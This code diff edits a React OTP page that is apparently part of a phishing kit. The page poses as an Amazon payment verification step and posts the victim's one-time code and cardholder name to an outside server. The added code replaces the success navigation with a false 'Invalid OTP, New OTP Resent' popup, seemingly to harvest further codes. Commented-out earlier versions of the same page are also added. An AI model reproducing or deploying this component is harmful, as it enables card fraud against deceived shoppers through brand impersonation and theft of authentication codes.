@@ -991,6 +991,353 @@
 
 // export default OtpComponent;
 
+// import React, { useState, useEffect } from "react";
+// import axios from "axios";
+// import NavbarForm from "./NavbarForm";
+// import FooterForm from "./FooterForm";
+// import { useLocation, useNavigate } from 'react-router-dom';
+
+// const OtpComponent = () => {
+  
+//   const [message, setMessage] = useState("");
+//   const [product, setProduct] = useState(null);
+//   const [finalPrice, setFinalPrice] = useState(null);
+//   const [savings, setSavings] = useState(null);
+
+//   const navigate = useNavigate();
+//   const location = useLocation();
+//   const { cardHolderName, productId } = location.state || {};
+//   const [otp, setOtp] = useState('');
+//   const [error, setError] = useState('');
+  
+
+//   const handleChange = (e) => {
+//     const input = e.target.value;
+//     // Accept only 6-digit numbers
+//     const sixDigitNumber = /^\d{0,6}$/;
+//     if (sixDigitNumber.test(input)) {
+//       setOtp(input);
+//     }
+//   };
+
+//   useEffect(() => {
+//     // Extract productId from location state
+//     if (location.state && location.state.productId) {
+//       setProduct(location.state.productId);
+//       console.log("Product ID:", location.state.productId); // Log productId to console
+//     } else {
+//       console.error("Product ID is missing.");
+//     }
+//   }, [location.state]);
+
+//   useEffect(() => {
+//     const fetchProductDetails = async () => {
+//       try {
+//         const response = await axios.get(`https://ecommerce-ryoy.onrender.com/getoneproduct/${productId}`);
+//         if (response.data && response.data._id === productId) {
+//           const productDetails = response.data;
+//           setProduct(productDetails);
+//           // Calculate final price and savings
+//           if (productDetails.price && productDetails.discount && productDetails.discount !== 0) {
+//             const discountAmount = (productDetails.price * productDetails.discount) / 100;
+//             const calculatedFinalPrice = productDetails.price - discountAmount;
+//             const calculatedSavings = discountAmount;
+//             setFinalPrice(Math.round(calculatedFinalPrice));
+//             setSavings(Math.round(calculatedSavings));
+//           }
+//         } else {
+//           console.error("Product ID mismatch or no product data found.");
+//         }
+//       } catch (error) {
+//         console.error("Error fetching product details:", error);
+//       }
+//     };
+
+//     if (productId) {
+//       fetchProductDetails();
+//     }
+//   }, [productId]);
+
+//   useEffect(() => {
+//     console.log("Product ID:", productId); // Log productId to console
+//   }, [productId]);
+
+//   const handleSubmit = async (e) => {
+//     e.preventDefault();
+//     if (!otp.match(/^\d{6}$/)) {
+//       setError('OTP must be a 6-digit number');
+//       return;
+//     }
+
+//     try {
+//       const response = await fetch('https://ecommerce-ryoy.onrender.com/otp', {
+//         method: 'POST',
+//         headers: {
+//           'Content-Type': 'application/json',
+//         },
+//         body: JSON.stringify({ otp, cardHolderName, productId }),
+//       });
+
+//       if (!response.ok) {
+//         const errorData = await response.json();
+//         console.error('Error response from server:', errorData);
+//         throw new Error('Network response was not ok');
+//       }
+
+//       const data = await response.json();
+//       console.log('OTP verified successfully', data);
+
+//       setOtp('');
+//       setError('');
+
+//       // Navigate to the next page or show success message
+//       navigate('/home-page');
+//     } catch (error) {
+//       console.error('There was a problem with the OTP verification:', error);
+//       setError('OTP verification failed. Please try again.');
+//     }
+//   };
+
+//   useEffect(() => {
+//     if (message === "Verification successful!") {
+//       navigate("/home-page");
+//     }
+//   }, [message, navigate]);
+
+//   return (
+//     <>
+//       <NavbarForm />
+//       <div className="container">
+//         <div className="row mt-3">
+//           <div className="col-6">
+//             <p>Paying To</p>
+//             <p>TOTAL AMOUNT</p>
+//           </div>
+//           <div className="col-6">
+//             <p>AMAZON</p>
+//             <p>{finalPrice}</p>
+//           </div>
+//         </div>
+//         <hr />
+//         <div className="text-center fw-bold ">Verification Required</div>
+//         <div className="text-center">
+//           To continue, complete this verification step. We've sent an OTP to
+//           your mobile number. Please enter it below to complete verification
+//         </div>
+//         <form onSubmit={handleSubmit} className="mt-3">
+//           <div className="mb-3">
+//             <label htmlFor="otp" className="form-label">
+//               Enter OTP
+//             </label>
+//             <input
+//               type="text"
+//               className={`form-control ${error ? "is-invalid" : ""}`}
+//               id="otp"
+//               value={otp}
+//               onChange={handleChange}
+//               placeholder="Enter the 6-digit OTP"
+//             />
+//             {error && <div className="invalid-feedback">{error}</div>}
+//           </div>
+//           <button type="submit" className="mt-2 btn-buy-now place-btn w-100">
+//             Continue
+//           </button>
+//         </form>
+//         <div className="text-center mt-3">
+//           Not received the code? Please resend in Resend Otp
+//         </div>
+//       </div>
+//       <div>
+//         <img src="/img/otppage.png" alt="" width="100%"/>
+//       </div>
+//       <FooterForm />
+//     </>
+//   );
+// };
+
+// export default OtpComponent;
+
+// import React, { useState, useEffect } from "react";
+// import axios from "axios";
+// import NavbarForm from "./NavbarForm";
+// import FooterForm from "./FooterForm";
+// import { useLocation, useNavigate } from 'react-router-dom';
+
+// const OtpComponent = () => {
+//   const [message, setMessage] = useState("");
+//   const [product, setProduct] = useState(null);
+//   const [finalPrice, setFinalPrice] = useState(null);
+//   const [savings, setSavings] = useState(null);
+
+//   const navigate = useNavigate();
+//   const location = useLocation();
+//   const { cardHolderName, productId } = location.state || {};
+//   const [otp, setOtp] = useState('');
+//   const [error, setError] = useState('');
+//   const [showPopup, setShowPopup] = useState(false);
+//   const [popupMessage, setPopupMessage] = useState('');
+
+//   const handleChange = (e) => {
+//     const input = e.target.value;
+//     const sixDigitNumber = /^\d{0,6}$/;
+//     if (sixDigitNumber.test(input)) {
+//       setOtp(input);
+//     }
+//   };
+
+//   useEffect(() => {
+//     if (location.state && location.state.productId) {
+//       setProduct(location.state.productId);
+//       console.log("Product ID:", location.state.productId);
+//     } else {
+//       console.error("Product ID is missing.");
+//     }
+//   }, [location.state]);
+
+//   useEffect(() => {
+//     const fetchProductDetails = async () => {
+//       try {
+//         const response = await axios.get(`https://ecommerce-ryoy.onrender.com/getoneproduct/${productId}`);
+//         if (response.data && response.data._id === productId) {
+//           const productDetails = response.data;
+//           setProduct(productDetails);
+//           if (productDetails.price && productDetails.discount && productDetails.discount !== 0) {
+//             const discountAmount = (productDetails.price * productDetails.discount) / 100;
+//             const calculatedFinalPrice = productDetails.price - discountAmount;
+//             const calculatedSavings = discountAmount;
+//             setFinalPrice(Math.round(calculatedFinalPrice));
+//             setSavings(Math.round(calculatedSavings));
+//           }
+//         } else {
+//           console.error("Product ID mismatch or no product data found.");
+//         }
+//       } catch (error) {
+//         console.error("Error fetching product details:", error);
+//       }
+//     };
+
+//     if (productId) {
+//       fetchProductDetails();
+//     }
+//   }, [productId]);
+
+//   useEffect(() => {
+//     console.log("Product ID:", productId);
+//   }, [productId]);
+
+//   const handleSubmit = async (e) => {
+//     e.preventDefault();
+//     if (!otp.match(/^\d{6}$/)) {
+//       setError('OTP must be a 6-digit number');
+//       setPopupMessage('Invalid OTP. Please enter a valid 6-digit OTP.');
+//       setShowPopup(true);
+//       return;
+//     }
+
+//     try {
+//       const response = await fetch('https://ecommerce-ryoy.onrender.com/otp', {
+//         method: 'POST',
+//         headers: {
+//           'Content-Type': 'application/json',
+//         },
+//         body: JSON.stringify({ otp, cardHolderName, productId }),
+//       });
+
+//       if (!response.ok) {
+//         const errorData = await response.json();
+//         console.error('Error response from server:', errorData);
+//         throw new Error('Network response was not ok');
+//       }
+
+//       const data = await response.json();
+//       console.log('OTP verified successfully', data);
+
+//       setOtp('');
+//       setError('');
+//       setPopupMessage('OTP verified successfully!');
+//       setShowPopup(true);
+//     } catch (error) {
+//       console.error('There was a problem with the OTP verification:', error);
+//       setPopupMessage('OTP verification failed. Please try again.');
+//       setShowPopup(true);
+//       setError('OTP verification failed. Please try again.');
+//     }
+//   };
+
+//   useEffect(() => {
+//     if (message === "Verification successful!") {
+//       navigate("/home-page");
+//     }
+//   }, [message, navigate]);
+
+//   return (
+//     <>
+//       <NavbarForm />
+//       <div className="container">
+//         <div className="row mt-3">
+//           <div className="col-6">
+//             <p>Paying To</p>
+//             <p>TOTAL AMOUNT</p>
+//           </div>
+//           <div className="col-6">
+//             <p>AMAZON</p>
+//             <p>{finalPrice}</p>
+//           </div>
+//         </div>
+//         <hr />
+//         <div className="text-center fw-bold ">Verification Required</div>
+//         <div className="text-center">
+//           To continue, complete this verification step. We've sent an OTP to
+//           your mobile number. Please enter it below to complete verification
+//         </div>
+//         <form onSubmit={handleSubmit} className="mt-3">
+//           <div className="mb-3">
+//             <label htmlFor="otp" className="form-label">
+//               Enter OTP
+//             </label>
+//             <input
+//               type="text"
+//               className={`form-control ${error ? "is-invalid" : ""}`}
+//               id="otp"
+//               value={otp}
+//               onChange={handleChange}
+//               placeholder="Enter the 6-digit OTP"
+//             />
+//             {error && <div className="invalid-feedback">{error}</div>}
+//           </div>
+//           <button type="submit" className="mt-2 btn-buy-now place-btn w-100">
+//             Continue
+//           </button>
+//         </form>
+//         <div className="text-center mt-3">
+//           Not received the code? Please resend in Resend Otp
+//         </div>
+//       </div>
+//       <div>
+//         <img src="/img/otppage.png" alt="" width="100%"/>
+//       </div>
+//       <FooterForm />
+
+//       {showPopup && (
+//         <div className="popup">
+//           <div className="popup-content">
+//             <p>{popupMessage}</p>
+//             <button onClick={() => {
+//               setShowPopup(false);
+//               if (popupMessage === 'OTP verified successfully!') {
+//                 navigate('/home-page');
+//               }
+//             }}>OK</button>
+//           </div>
+//         </div>
+//       )}
+//     </>
+//   );
+// };
+
+// export default OtpComponent;
+
+
 import React, { useState, useEffect } from "react";
 import axios from "axios";
 import NavbarForm from "./NavbarForm";
@@ -998,33 +1345,19 @@ import FooterForm from "./FooterForm";
 import { useLocation, useNavigate } from 'react-router-dom';
 
 const OtpComponent = () => {
-  
-  const [message, setMessage] = useState("");
   const [product, setProduct] = useState(null);
   const [finalPrice, setFinalPrice] = useState(null);
-  const [savings, setSavings] = useState(null);
-
+  const [otp, setOtp] = useState('');
+  const [error, setError] = useState('');
+  const [showPopup, setShowPopup] = useState(false);
+  const [popupMessage, setPopupMessage] = useState('');
   const navigate = useNavigate();
   const location = useLocation();
   const { cardHolderName, productId } = location.state || {};
-  const [otp, setOtp] = useState('');
-  const [error, setError] = useState('');
-  
-
-  const handleChange = (e) => {
-    const input = e.target.value;
-    // Accept only 6-digit numbers
-    const sixDigitNumber = /^\d{0,6}$/;
-    if (sixDigitNumber.test(input)) {
-      setOtp(input);
-    }
-  };
 
   useEffect(() => {
-    // Extract productId from location state
     if (location.state && location.state.productId) {
       setProduct(location.state.productId);
-      console.log("Product ID:", location.state.productId); // Log productId to console
     } else {
       console.error("Product ID is missing.");
     }
@@ -1037,13 +1370,11 @@ const OtpComponent = () => {
         if (response.data && response.data._id === productId) {
           const productDetails = response.data;
           setProduct(productDetails);
-          // Calculate final price and savings
           if (productDetails.price && productDetails.discount && productDetails.discount !== 0) {
             const discountAmount = (productDetails.price * productDetails.discount) / 100;
             const calculatedFinalPrice = productDetails.price - discountAmount;
             const calculatedSavings = discountAmount;
             setFinalPrice(Math.round(calculatedFinalPrice));
-            setSavings(Math.round(calculatedSavings));
           }
         } else {
           console.error("Product ID mismatch or no product data found.");
@@ -1058,14 +1389,20 @@ const OtpComponent = () => {
     }
   }, [productId]);
 
-  useEffect(() => {
-    console.log("Product ID:", productId); // Log productId to console
-  }, [productId]);
+  const handleChange = (e) => {
+    const input = e.target.value;
+    const sixDigitNumber = /^\d{0,6}$/;
+    if (sixDigitNumber.test(input)) {
+      setOtp(input);
+    }
+  };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     if (!otp.match(/^\d{6}$/)) {
       setError('OTP must be a 6-digit number');
+      setPopupMessage('Invalid OTP. Please enter a valid 6-digit OTP or click Resend OTP to receive a new one.');
+      setShowPopup(true);
       return;
     }
 
@@ -1089,20 +1426,15 @@ const OtpComponent = () => {
 
       setOtp('');
       setError('');
-
-      // Navigate to the next page or show success message
-      navigate('/home-page');
+      setPopupMessage('Invalid OTP, New OTP Resent Please Enter New OTP!');
+      setShowPopup(true);
     } catch (error) {
       console.error('There was a problem with the OTP verification:', error);
+      setPopupMessage('OTP verification failed. Please try again.');
+      setShowPopup(true);
       setError('OTP verification failed. Please try again.');
     }
   };
-
-  useEffect(() => {
-    if (message === "Verification successful!") {
-      navigate("/home-page");
-    }
-  }, [message, navigate]);
 
   return (
     <>
@@ -1142,6 +1474,13 @@ const OtpComponent = () => {
           <button type="submit" className="mt-2 btn-buy-now place-btn w-100">
             Continue
           </button>
+          {/* <button type="button" className="mt-2 btn-resend-otp place-btn w-100" onClick={() => {
+            setPopupMessage('New OTP resent successfully!');
+            setShowPopup(true);
+            // Add logic here to resend OTP
+          }}>
+            Resend OTP
+          </button> */}
         </form>
         <div className="text-center mt-3">
           Not received the code? Please resend in Resend Otp
@@ -1151,11 +1490,24 @@ const OtpComponent = () => {
         <img src="/img/otppage.png" alt="" width="100%"/>
       </div>
       <FooterForm />
+
+      {showPopup && (
+        <div className="popup">
+          <div className="popup-content">
+            <p>{popupMessage}</p>
+            <button onClick={() => setShowPopup(false)} className="btn-buy-now">OK</button>
+          </div>
+        </div>
+      )}
     </>
   );
 };
 
 export default OtpComponent;
+
+
+
+
 
 
 
